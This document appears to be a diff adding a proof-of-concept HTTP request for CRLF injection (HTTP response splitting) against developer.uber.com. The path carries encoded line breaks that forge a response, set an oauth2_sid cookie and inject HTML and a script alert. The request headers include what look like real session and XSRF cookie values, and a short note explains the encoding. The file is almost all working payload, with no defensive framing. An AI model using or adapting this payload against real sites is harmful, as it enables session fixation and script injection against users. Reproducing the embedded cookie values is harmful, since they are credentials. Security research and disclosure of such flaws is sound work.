@@ -1,0 +1,14 @@
+GET /dashboard/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: oauth2_sid="r0Fs96ZB7tKfqSQ56jY7IlReA3wuF3o4/cLwQ02Pn8hdWLEfnkcD5Nc9ITruyiyUlNOTXu/le7IQLC9tNdvdEoiZYPZC3OXa7ZNQU4sT9ZGFQzF3kSyL8c8BgGGEWqH6"%0d%0a%0d%0a%3Chtml%3EHacker Content%3C/html%3E%0d%0a%0d%0a%3Cscript%3Ealert("Injected js")%3C/script%3E%0d%0a%0d%0a<!-- HTTP/1.1
+Host: developer.uber.com
+Referer: https://developer.uber.com/
+Cookie: XSRF-TOKEN=OkkZ43igro0JS7lm%2B2pdjhh1%2FzzqkueR%2Fgfs4%3D; connect.sid=s%3AHgMm40tOJjVdF6js3Oxv8GP4.RE%2F3fmd02tETNwUaC8AhFzUhLSqsjcCYZo5NsgP%2BTf8;
+Host: developer.uber.com
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+Connection: close
+
+
+
+Note  %0d%0a is used as carriage return 
